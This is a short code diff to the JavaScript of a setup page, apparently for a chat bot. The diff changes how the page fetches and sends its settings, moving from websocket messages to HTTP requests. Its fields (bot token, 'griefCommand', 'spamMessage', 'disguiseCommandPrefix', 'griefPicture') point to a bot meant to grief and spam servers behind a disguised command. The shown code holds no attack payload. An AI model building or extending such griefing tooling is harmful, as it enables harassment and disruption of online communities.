@@ -1,5 +1,8 @@
 
 window.onload = function () {
+
+    sendRequest("info?method=config", initValues);
+
     document.getElementById("submitBtn").addEventListener("click", () => {
         let botToken = document.getElementById("botToken").value;
         let userID = document.getElementById("userID").value;
@@ -17,7 +20,7 @@ window.onload = function () {
             griefPicture = (griefPicture == "") ? document.getElementById("griefPicture").placeholder : griefPicture;
 
             const jsonObj = { botToken: botToken, userID: userID, activityDescription: activityDescription, disguiseCommandPrefix: disguiseCommandPrefix, griefCommand: griefCommand, griefMessage: griefMessage, spamMessage: spamMessage, griefPicture: griefPicture };
-            socket.send("SETUP|" + btoa(JSON.stringify(jsonObj)));
+            sendRequest("setup?value=" + btoa(JSON.stringify(jsonObj)), null);
             document.getElementById("alert-success").hidden = false;
         } else {
             location.reload();
@@ -25,10 +28,6 @@ window.onload = function () {
     });
 
 }
-
-const socketOpenListener = (event) => {
-    socket.send("GET|CONFIG");
-};
 
 function initValues(message) {
     let json = JSON.parse(atob(message));
